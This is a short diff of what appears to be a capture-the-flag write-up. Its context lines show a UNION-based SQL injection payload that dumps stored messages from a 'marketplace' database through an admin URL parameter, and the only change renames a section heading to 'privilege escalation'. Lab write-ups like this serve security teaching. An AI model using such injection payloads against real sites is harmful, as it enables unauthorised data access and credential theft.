@@ -45,7 +45,7 @@ now we can inject some sql code to access the database also we can try union bas
 
 /admin?user=0 union select 1,group_concat(message_content,'\n'),3,4 from marketplace.messages-- -
 
-## Enumeration
+## privilege escalation
 
 after found the username and the ssh password
 
